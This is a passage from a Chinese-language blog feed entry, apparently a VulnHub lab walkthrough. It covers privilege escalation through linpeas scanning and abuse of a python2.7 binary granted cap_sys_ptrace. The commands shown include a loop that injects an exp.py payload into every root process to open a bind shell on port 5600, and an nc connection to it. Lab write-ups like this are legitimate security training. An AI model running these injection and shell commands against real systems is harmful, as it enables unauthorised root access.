class=&#34;language-bash&#34;&gt;/dev/null在这条命令中扮演的角色是保存script记录的文件，但是/dev/null一个特殊的设备文件，一切写入改文件的数据都会消失。我们不需要记录我们所执行的命令，所以将script所记录的内容指向该设备文件。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-653.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;linpeas-提权信息扫描&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#linpeas-提权信息扫描&#34;&gt;#&lt;/a&gt; linpeas 提权信息扫描&lt;/h3&gt;
&lt;p&gt;尝试用 linux 提权工具提权，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1rYWxpbGlucGVhcy0zcDhxbTIwYjN4Ynp3OGFmN2dsNGI4eDNnLnNo&#34;&gt;提前在 kali 上准备好 linpeas.sh&lt;/span&gt; 并通过 py 开启简易 web&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-654.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;在靶机上下载 linpeas.sh 并加可执行权限&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-655.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;执行并开始扫描./linpeas.sh&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-656.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;发现了 python2.7 的权限设置错误&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-657.png&#34; width=&#34;360&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;cap_sys_ptrace-提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cap_sys_ptrace-提权&#34;&gt;#&lt;/a&gt; cap_sys_ptrace 提权&lt;/h3&gt;
&lt;p&gt;关于 cap_sys_ptrace 提权的教程：&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ib29rLmhhY2t0cmlja3MueHl6L2xpbnV4LWhhcmRlbmluZy9wcml2aWxlZ2UtZXNjYWxhdGlvbi9saW51eC1jYXBhYmlsaXRpZXM=&#34;&gt;https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Capabilities 机制是在 Linux 内核 2.2 之后引入的，原理很简单，就是将之前与超级用户 root（UID=0）关联的特权细分为不同的功能组，Capabilites 作为线程（Linux 并不真正区分进程和线程）的属性存在，每个功能组都可以独立启用和禁用。其本质上就是将内核调用分门别类，具有相似功能的内核调用被分到同一组中。&lt;/p&gt;
&lt;p&gt;这样一来，权限检查的过程就变成了：在执行特权操作时，如果线程的有效身份不是 root，就去检查其是否具有该特权操作所对应的 capabilities，并以此为依据，决定是否可以执行特权操作。如果 Capabilities 设置不正确，就会让攻击者有机可乘，实现权限提升。&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-658.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;保存 payload，并按 hacktrick 上的教程进行复现&lt;/p&gt;
&lt;p&gt;利用参考中的 exp.py 文件，传入参数为选择的进程 id, 执行成功后会在靶机的 5600 端口开一个绑定 shell&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-659.png&#34; width=&#34;460&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;Capabilities的主要思想在于分割root用户的特权，即将root的特权分割成不一样的能力，每种能力表明必定的特权操做。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;setcap&lt;/span&gt;来设置权限，&lt;span class=&#34;built_in&#34;&gt;getcap&lt;/span&gt;来验证权限是否设置正确。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;CAP_SYS_PTRACE允许使用ptrace( 2 )和最近引入的跨内存附加系统调用，如果授予此功能并且ptrace( 2 )系统调用本身没有被 seccomp 过滤器阻止，这将允许攻击者绕过其他 seccomp 限制。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;getcap -r / 2&amp;gt;/dev/null&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/usr/bin/python2.7 = cap_sys_ptrace+ep&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;通过&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt;循环，来依次注入每一个root进程号&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;for i in `ps -ef|grep root|grep -v &amp;quot;grep&amp;quot;|awk &amp;#x27;&amp;#123;print $2&amp;#125;&amp;#x27;`; do python2.7 exp.py $i; done&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-660.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;注入成功后即可获取到root权限的shell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;netstat -an | grep 5600&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nc 192.168.31. 11 5600&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-661.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 成功拿到 root 权限&lt;/p&gt;
</content>
        <category term="VULNHUB 21-30" />
        <updated>2021-10-31T16:00:00.000Z</updated>
    </entry>
</feed>
